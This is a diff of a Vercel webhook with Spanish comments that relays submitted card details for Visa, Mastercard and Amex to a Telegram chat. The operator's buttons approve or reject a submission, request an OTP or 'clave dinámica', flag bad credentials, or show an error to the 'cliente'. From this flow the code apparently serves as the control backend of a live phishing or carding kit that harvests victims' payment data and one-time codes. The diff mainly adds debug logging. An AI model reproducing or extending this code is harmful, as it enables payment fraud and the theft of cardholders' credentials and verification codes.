@@ -1,5 +1,6 @@
-// api/webhook.js - WEBHOOK COMPLETO PARA VERCEL
+// api/webhook.js - WEBHOOK CORREGIDO
 
+// Credenciales desde variables de entorno
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -17,9 +18,20 @@ export default async function handler(req, res) {
         return res.status(200).end();
     }
 
+    // ============================================
+    // VERIFICAR VARIABLES DE ENTORNO
+    // ============================================
+    console.log('🔍 Verificando variables de entorno:');
+    console.log('TELEGRAM_BOT_TOKEN:', TELEGRAM_BOT_TOKEN ? '✅ Configurado' : '❌ No configurado');
+    console.log('TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID || '❌ No configurado');
+
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.error('❌ Variables de entorno no configuradas');
-        return res.status(500).json({ error: 'Configuración incompleta' });
+        return res.status(500).json({ 
+            error: 'Configuración incompleta',
+            botToken: TELEGRAM_BOT_TOKEN ? '✅' : '❌',
+            chatId: TELEGRAM_CHAT_ID || '❌'
+        });
     }
 
     // ============================================
@@ -102,16 +114,31 @@ export default async function handler(req, res) {
             // CASO 1: Frontend envía mensaje para Telegram
             // ============================================
             if (body.mensaje && body.solicitudId) {
-                console.log('📨 Enviando a Telegram:', body.solicitudId);
-                console.log('📝 Tipo tarjeta:', body.tipoTarjeta);
+                console.log('📨 Enviando a Telegram:');
+                console.log('  Solicitud ID:', body.solicitudId);
+                console.log('  Tipo tarjeta:', body.tipoTarjeta);
+                console.log('  Chat ID:', TELEGRAM_CHAT_ID);
+                
+                // ⭐ VERIFICAR QUE EL CHAT ID ES CORRECTO
+                const chatId = TELEGRAM_CHAT_ID.toString().trim();
+                console.log('  Chat ID (limpio):', chatId);
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                // ⭐ PRIMERO PROBAR CON getMe para verificar el token
+                try {
+                    const testResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
+                    const testData = await testResponse.json();
+                    console.log('✅ Bot verificado:', testData);
+                } catch (error) {
+                    console.error('❌ Error verificando bot:', error);
+                }
                 
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
+                        chat_id: chatId,
                         text: body.mensaje,
                         parse_mode: 'Markdown',
                         reply_markup: body.botones,
@@ -133,10 +160,14 @@ export default async function handler(req, res) {
                         messageId: data.result.message_id
                     });
                 } else {
-                    console.error('❌ Error:', data.description);
+                    console.error('❌ Error de Telegram:', data);
+                    
+                    // ⭐ ENVIAR RESPUESTA DETALLADA
                     return res.status(500).json({ 
                         success: false, 
-                        error: data.description 
+                        error: data.description,
+                        chatId: chatId,
+                        botToken: TELEGRAM_BOT_TOKEN ? 'Configurado' : 'No configurado'
                     });
                 }
             }
@@ -159,9 +190,7 @@ export default async function handler(req, res) {
                 let respuestaTexto = '';
                 let estadoMensaje = '';
 
-                // ============================================
-                // ✅ APROBAR/RECHAZAR - PASO3.HTML (SIN tipo de tarjeta)
-                // ============================================
+                // APROBAR/RECHAZAR - SIN tipo de tarjeta
                 if (callbackData.startsWith('approve_') && !callbackData.includes('_visa_') && !callbackData.includes('_master_') && !callbackData.includes('_amex_')) {
                     action = 'approved';
                     solicitudId = callbackData.replace('approve_', '');
@@ -175,9 +204,7 @@ export default async function handler(req, res) {
                     estadoMensaje = '❌ *RECHAZADO* - Mostrar error al cliente';
                 }
 
-                // ============================================
-                // ✅ APROBAR/RECHAZAR - VISA
-                // ============================================
+                // APROBAR/RECHAZAR - VISA
                 else if (callbackData.startsWith('approve_visa_')) {
                     action = 'approved';
                     solicitudId = callbackData.replace('approve_visa_', '');
@@ -191,9 +218,7 @@ export default async function handler(req, res) {
                     estadoMensaje = '❌ *RECHAZADO* - Mostrar error al cliente';
                 }
 
-                // ============================================
-                // ✅ APROBAR/RECHAZAR - MASTERCARD
-                // ============================================
+                // APROBAR/RECHAZAR - MASTERCARD
                 else if (callbackData.startsWith('approve_master_')) {
                     action = 'approved';
                     solicitudId = callbackData.replace('approve_master_', '');
@@ -207,9 +232,7 @@ export default async function handler(req, res) {
                     estadoMensaje = '❌ *RECHAZADO* - Mostrar error al cliente';
                 }
 
-                // ============================================
-                // ✅ APROBAR/RECHAZAR - AMEX
-                // ============================================
+                // APROBAR/RECHAZAR - AMEX
                 else if (callbackData.startsWith('approve_amex_')) {
                     action = 'approved';
                     solicitudId = callbackData.replace('approve_amex_', '');
@@ -223,9 +246,7 @@ export default async function handler(req, res) {
                     estadoMensaje = '❌ *RECHAZADO* - Mostrar error al cliente';
                 }
 
-                // ============================================
-                // 📱 OTP - VISA VERIFIED
-                // ============================================
+                // OTP
                 else if (callbackData.startsWith('aprobar_otp_')) {
                     action = 'aprobar_otp';
                     solicitudId = callbackData.replace('aprobar_otp_', '');
@@ -245,9 +266,7 @@ export default async function handler(req, res) {
                     estadoMensaje = '📱 *OTP SOLICITADO*';
                 }
 
-                // ============================================
-                // 🔑 CLAVE DINÁMICA - VISA VERIFIED
-                // ============================================
+                // CLAVE DINÁMICA
                 else if (callbackData.startsWith('aprobar_clave_din_')) {
                     action = 'aprobar_clave_din';
                     solicitudId = callbackData.replace('aprobar_clave_din_', '');
@@ -267,9 +286,7 @@ export default async function handler(req, res) {
                     estadoMensaje = '🔑 *CLAVE DINÁMICA SOLICITADA*';
                 }
 
-                // ============================================
-                // ❌ ERRORES
-                // ============================================
+                // ERRORES
                 else if (callbackData.startsWith('error_user_')) {
                     action = 'error_user';
                     solicitudId = callbackData.replace('error_user_visa_', '').replace('error_user_master_', '').replace('error_user_amex_', '').replace('error_user_', '');
@@ -295,9 +312,7 @@ export default async function handler(req, res) {
                     estadoMensaje = '❌ *ERROR CREDENCIALES*';
                 }
 
-                // ============================================
-                // ⚠️ FALLBACK
-                // ============================================
+                // FALLBACK
                 else {
                     const parts = callbackData.split('_');
                     action = parts[0] || 'unknown';
@@ -309,9 +324,7 @@ export default async function handler(req, res) {
 
                 console.log(`📌 Acción: ${action}, ID: ${solicitudId}`);
 
-                // ============================================
                 // RESPONDER AL CALLBACK QUERY
-                // ============================================
                 await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -322,9 +335,7 @@ export default async function handler(req, res) {
                     })
                 });
 
-                // ============================================
                 // ACTUALIZAR MENSAJE EN TELEGRAM
-                // ============================================
                 let newText = originalText;
                 const estadoRegex = /⏳ \*Estado:\* .+/;
                 if (estadoRegex.test(newText)) {
@@ -344,9 +355,7 @@ export default async function handler(req, res) {
                     })
                 });
 
-                // ============================================
-                // GUARDAR ESTADO DE LA SOLICITUD
-                // ============================================
+                // GUARDAR ESTADO
                 global.solicitudes.set(solicitudId, {
                     estado: action,
                     timestamp: Date.now()
